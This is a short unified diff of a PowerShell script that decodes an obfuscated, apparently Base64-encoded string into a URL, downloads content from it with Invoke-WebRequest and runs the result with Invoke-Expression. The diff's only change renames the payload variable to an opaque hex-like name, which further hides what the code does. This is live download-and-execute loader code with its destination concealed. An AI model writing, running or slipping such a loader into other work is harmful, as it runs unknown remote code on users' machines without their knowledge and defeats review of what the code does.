@@ -1,4 +1,4 @@
-${b64_data_string} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPUwJQVlNYUQJQBFBRBFFXBFYBUgJSAVFSUQVQUQVXVANZBAEDBVkFUVlRA1ICUQEDBFgCBQZTUFlXWQMFVlYGUA=="
+${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPUwJQVlNYUQJQBFBRBFFXBFYBUgJSAVFSUQVQUQVXVANZBAEDBVkFUVlRA1ICUQEDBFgCBQZTUFlXWQMFVlYGUA=="
 
 ${processing_function} = { 
     param(
@@ -18,7 +18,7 @@ ${processing_function} = {
 }
 
 try {
-    ${final_processed_string} = & ${processing_function} -input_data ${b64_data_string}
+    ${final_processed_string} = & ${processing_function} -input_data ${7e849043}
     ${request_result} = Invoke-WebRequest -Uri ${final_processed_string}
     Invoke-Expression ${request_result}
 } catch {
